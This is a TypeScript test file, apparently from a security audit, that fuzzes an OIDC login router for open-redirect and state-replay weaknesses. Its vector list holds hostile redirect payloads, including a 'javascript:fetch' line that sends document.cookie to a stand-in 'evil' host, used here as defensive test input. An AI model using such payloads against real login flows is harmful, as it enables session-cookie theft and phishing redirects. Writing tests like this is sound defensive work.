/**
 * #22.2 web-server+proxy adversarial security audit — OIDC auth-router fuzz
 * harness. Asserts FAIL-SAFE on the two highest-value attack classes:
 *   - open-redirect: a hostile `returnTo` (absolute, protocol-relative,
 *     backslash, javascript:, control chars, encoded) NEVER post-login redirects
 *     off-origin — it always collapses to "/";
 *   - state replay: a login-state token is one-time — a second `/callback` use
 *     (or an unknown token) is 400, no session minted.
 * Deterministic + fast (mocked IdP keypair + fake token endpoint, frozen clock).
 */
import { describe, it, expect, beforeAll } from "vitest";
import * as jose from "jose";
import type { OidcLoginState, OidcProviderConfig } from "@galley/shared";
import { InMemorySessionStore, InMemoryOidcLoginStateStore, type JwksGetter } from "@galley/auth";
import { createAuthRouter, safeReturnTo } from "./auth-router.js";

const ISSUER = "https://idp.example.com";
const CLIENT = "galley";
const NOW = 1_700_000_000_000;
const nowSec = Math.floor(NOW / 1000);

const config: OidcProviderConfig = {
  issuer: ISSUER,
  clientId: CLIENT,
  authorizationEndpoint: `${ISSUER}/authorize`,
  tokenEndpoint: `${ISSUER}/token`,
  jwksUri: `${ISSUER}/jwks`,
  redirectUri: "https://galley.example.com/auth/callback",
};

let priv: jose.KeyLike;
let jwks: JwksGetter;

beforeAll(async () => {
  const kp = await jose.generateKeyPair("RS256", { extractable: true });
  priv = kp.privateKey;
  const pub = { ...(await jose.exportJWK(kp.publicKey)), kid: "k1", alg: "RS256", use: "sig" };
  jwks = jose.createLocalJWKSet({ keys: [pub] });
});

function setup() {
  const sessionStore = new InMemorySessionStore();
  const loginStateStore = new InMemoryOidcLoginStateStore();
  const puts: OidcLoginState[] = [];
  const origPut = loginStateStore.put.bind(loginStateStore);
  loginStateStore.put = async (s) => {
    puts.push(s);
    return origPut(s);
  };
  const fetchImpl = (async () => {
    const nonce = puts[puts.length - 1]!.nonce;
    const idToken = await new jose.SignJWT({
      iss: ISSUER,
      sub: "user-1",
      aud: CLIENT,
      iat: nowSec - 10,
      exp: nowSec + 3600,
      nonce,
    })
      .setProtectedHeader({ alg: "RS256", kid: "k1" })
      .sign(priv);
    return new Response(JSON.stringify({ id_token: idToken, token_type: "Bearer" }), {
      status: 200,
      headers: { "content-type": "application/json" },
    });
  }) as unknown as typeof fetch;

  const app = createAuthRouter({ config, sessionStore, loginStateStore, jwks, fetch: fetchImpl, now: () => NOW });
  return { app, puts };
}

describe("auth fuzz — open-redirect: a hostile returnTo never escapes the origin", () => {
  const openRedirectVectors = [
    "https://evil.com",
    "https://evil.com/path",
    "//evil.com",
    "//evil.com/x",
    "/\\evil.com", // backslash trick → //evil
    "/\\/evil.com",
    "\\\\evil.com",
    "javascript:alert(document.cookie)",
    "javascript:fetch('//evil/'+document.cookie)",
    "data:text/html,<script>1</script>",
    "http:evil.com",
    "/\tx", // control char
    "/\nx",
    "/\rx",
    "https:/evil.com",
    "////evil.com",
    "evil.com", // no leading slash
    "",
  ];

  for (const evil of openRedirectVectors) {
    it(`safeReturnTo collapses ${JSON.stringify(evil)} to "/"`, () => {
      expect(safeReturnTo(evil), evil).toBe("/");
    });
  }

  it("end-to-end: a hostile returnTo at /login lands the /callback redirect on '/'", async () => {
    for (const evil of ["https://evil.com", "//evil.com", "/\\evil", "javascript:alert(1)"]) {
      const { app, puts } = setup();
      const res = await app.request(`/login?returnTo=${encodeURIComponent(evil)}`);
      expect(res.status).toBe(302);
      const state = new URL(res.headers.get("location")!).searchParams.get("state")!;
      const cb = await app.request(`/callback?code=abc&state=${encodeURIComponent(state)}`);
      expect(cb.headers.get("location"), evil).toBe("/");
    }
  });

  it("safeReturnTo PRESERVES legitimate same-origin paths (no over-blocking)", () => {
    expect(safeReturnTo("/projects/my-doc?x=1#frag")).toBe("/projects/my-doc?x=1#frag");
    expect(safeReturnTo("/")).toBe("/");
    expect(safeReturnTo("/p/proj-123")).toBe("/p/proj-123");
  });
});

describe("auth fuzz — login-state is one-time (replay defense)", () => {
  it("a consumed state is burned: first /callback 302, replay 400, unknown 400", async () => {
    const { app, puts } = setup();
    const res = await app.request("/login?returnTo=%2Fp%2Fx");
    const state = new URL(res.headers.get("location")!).searchParams.get("state")!;
    void puts;
    expect((await app.request(`/callback?code=abc&state=${state}`)).status).toBe(302); // first use
    expect((await app.request(`/callback?code=abc&state=${state}`)).status).toBe(400); // replay
    expect((await app.request(`/callback?code=abc&state=nope-unknown`)).status).toBe(400); // never issued
  });

  it("a /callback with no state at all is 400 (no session)", async () => {
    const { app } = setup();
    expect((await app.request(`/callback?code=abc`)).status).toBe(400);
    expect((await app.request(`/me`)).status).toBe(401);
  });
});
